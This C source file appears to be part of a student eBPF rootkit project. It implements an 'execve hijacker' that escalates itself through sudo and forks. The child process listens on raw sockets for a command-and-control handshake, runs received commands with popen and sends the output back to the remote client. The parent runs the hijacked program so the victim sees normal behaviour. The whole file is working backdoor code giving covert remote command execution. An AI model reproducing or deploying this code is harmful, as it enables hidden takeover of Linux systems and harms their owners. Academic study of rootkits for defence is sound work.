#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <sys/wait.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "lib/RawTCP.h"
#include "../common/c&c.h"
#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>

char* getLocalIpAddress(){
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    if(hostname==-1){
        exit(1);
    }
  
    host_entry = gethostbyname(hostbuffer);
    if(host_entry == NULL){
        exit(1);
    }
  
    // To convert an Internet network
    // address into ASCII string
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
    return IPbuffer;
}

char* execute_command(char* command){
    FILE *fp;
    char* res = calloc(4096, sizeof(char));
    char buf[1024];

    fp = popen(command, "r");
    if(fp == NULL) {
        printf("Failed to run command\n" );
        return "COMMAND ERROR";
    }

    while(fgets(buf, sizeof(buf), fp) != NULL) {
        strcat(res, buf);
    }
    printf("RESULT OF COMMAND: %s\n", res);

    pclose(fp);
    return res;
}

int hijacker_process_routine(char* argv[]){
    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
    if(fd<0){
        perror("Failed to open log file");
        //return -1;
    }

    time_t rawtime;
    struct tm * timeinfo;

    time ( &rawtime );
    timeinfo = localtime ( &rawtime );
    char* timestr = asctime(timeinfo);

    int ii = 0;
    while(*(timestr+ii)!='\0'){
        write(fd, timestr+ii, 1);
        ii++;
    }
    write(fd, "\t", 1);
    
    ii = 0;
    while(*(argv[0]+ii)!='\0'){
        write(fd, argv[0]+ii, 1);
        ii++;
    }

    write(fd, "\n", 1);
    write(fd, "Sniffing...\n", 13);
    

    packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
    if(packet.ipheader == NULL){
        write(fd, "Failed to open rawsocket\n", 1);
        return -1;
    }
    write(fd, "Sniffed\n", 9);
    //TODO GET THE IP FROM THE BACKDOOR CLIENT
    char* local_ip = getLocalIpAddress();
    char remote_ip[16];
    inet_ntop(AF_INET, &(packet.ipheader->saddr), remote_ip, 16);
    printf("IP: %s\n", local_ip);
    
    packet_t packet_ack = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_ACK);
    if(rawsocket_send(packet_ack)<0){
        write(fd, "Failed to open rawsocket\n", 1);
        close(fd);
        return -1;
    }

    //Start of pseudo connection with the rootkit client
    int connection_close = 0;
    while(!connection_close){
        packet_t packet = rawsocket_sniff_pattern(CC_PROT_MSG);
        printf("Received client message\n");
        char* payload = packet.payload;
        char *p;
        p = strtok(payload, "#");
        p = strtok(NULL, "#");
        if(p){
            if(strcmp(p, CC_PROT_FIN_PART)==0){
                printf("Connection closed by request\n");
                connection_close = 1;
            }else{
                printf("Received request: %s\n", p);
                char* res = execute_command(p);
                char* payload_buf = calloc(4096, sizeof(char));
                strcpy(payload_buf, CC_PROT_MSG);
                strcat(payload_buf, res);
                packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, payload_buf);
                if(rawsocket_send(packet_res)<0){
                    write(fd, "Failed to open rawsocket\n", 1);
                    close(fd);
                    return -1;
                }
                free(payload_buf);
                free(res);
            }
        }
    }

    close(fd);
    return 0;
}


int main(int argc, char* argv[], char *envp[]){
    printf("Hello world from execve hijacker\n");
    for(int ii=0; ii<argc; ii++){
        printf("Argument %i is %s\n", ii, argv[ii]);
    }

    if(geteuid() != 0){
        //We do not have privileges, but we do want them. Let's rerun the program now.
        char* args[argc+3]; 
        args[0] = "sudo";
        args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
        printf("execve ARGS%i: %s\n", 0, args[0]);
        printf("execve ARGS%i: %s\n", 1, args[1]);
        for(int ii=0; ii<argc; ii++){
            args[ii+2] = argv[ii];
            printf("execve ARGS%i: %s\n", ii+2, args[ii+2]);
        }
        args[argc+2] = NULL;
        
        if(execve("/usr/bin/sudo", args, envp)<0){
            perror("Failed to execve()");
            exit(-1);
        }
    }


    //We proceed to fork() and exec the original program, whilst also executing the one we 
    //ordered to execute via the network backdoor
    pid_t pid = fork();

    if (pid < 0) {
        perror("Fork failed");
    }
    if (pid == 0) {
        //Child process
        printf("I am the child with pid %d\n", (int) getpid());
        printf("Child process is exiting\n");
        hijacker_process_routine(argv);
        exit(0);
    }
    //Parent process. Call original hijacked command
    char* hij_args[argc]; 
    hij_args[0] = argv[1];
    printf("hijacking ARGS%i: %s\n", 0, hij_args[0]);
    for(int ii=0; ii<argc-2; ii++){
        hij_args[ii+1] = argv[ii+2];
        printf("hijacking ARGS%i: %s\n", ii+1, hij_args[ii+1]);
    }
    hij_args[argc-1] = NULL;
    
    if(execve(argv[1], hij_args, envp)<0){
        perror("Failed to execve() originally hijacked process");
        exit(-1);
    }
    
    wait(NULL);
    printf("parent process is exiting\n");
    return(0);


    
}